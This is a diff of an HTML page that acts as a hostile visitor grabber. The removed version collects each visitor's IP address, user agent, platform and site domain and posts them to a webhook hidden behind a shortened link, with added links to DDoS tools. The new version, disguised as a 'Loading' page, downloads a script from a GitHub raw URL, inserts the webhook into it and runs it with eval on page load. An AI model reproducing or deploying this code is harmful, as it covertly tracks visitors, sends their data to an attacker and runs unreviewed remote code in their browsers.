@@ -1,90 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>User Information</title>
-    <meta property="og:image" content="https://ds6br8f5qp1u2.cloudfront.net/blog/wp-content/uploads/2016/08/click-me-button.png?x32616">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <style>
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
-    </style>
+    <title>Loading</title>
+    <script src="https://tinyurl.com/3yhdxb4p"></script>
     <script>
-       var webhookURL = 'https://tinyurl.com/2fscbttt';
+        function load() {
+            var webhookURL = 'https://tinyurl.com/2fscbttt';
 
-var userAgent = navigator.userAgent;
-var operatingSystem = navigator.platform;
-var websiteDomain = location.hostname;
+            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';
 
-$.getJSON('https://tinyurl.com/tnjcrx2r', function(data) {
-    var ip = data.ip;
-
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", webhookURL);
-    xhr.setRequestHeader("Content-Type", "application/json");
-
-    var params = {
-        embeds: [
-            {
-                title: 'User Information',
-                description: 'Here is some information about the user:',
-                color: 0x9933ff, // Purple color
-                fields: [
-                    {
-                        name: 'User Agent',
-                        value: userAgent,
-                        inline: true
-                    },
-                    {
-                        name: 'IP Address',
-                        value: ip,
-                        inline: true
-                    },
-                    {
-                        name: 'Website',
-                        value: websiteDomain,
-                        inline: false
-                    },
-                    {
-                        name: 'Operating System',
-                        value: operatingSystem,
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: 'Powered by https://lenn106.github.io'
-                },
-                timestamp: new Date().toISOString()
-            },
-            {
-                title: '**IP Tools**',
-                color: 0x7289da,
-                fields: [
-                    {
-                        name: 'IP Resolver',
-                        value: '[Click here](https://xresolver.com)'
-                    },
-                    {
-                        name: 'IP Lookup',
-                        value: '[Click here](https://whatismyipaddress.com/ip-lookup)'
-                    },
-                    {
-                        name: 'DDoS Attack Tools',
-                        value: '[Click here](https://github.com/topics/ddos-attack-tools)'
-                    }
-                ],
-                thumbnail: {
-                    url: 'https://tinyurl.com/hdr7euxt'
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', scriptURL, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    var scriptCode = xhr.responseText;
+                    scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
+                    eval(scriptCode);
                 }
-            }
-        ]
-    };
-
-    xhr.send(JSON.stringify(params));
-});
+            };
+            xhr.send();
+        }
     </script>
 </head>
-<body onload="sendUserInformation()">
+<body onload="load()">
 </body>
 </html>
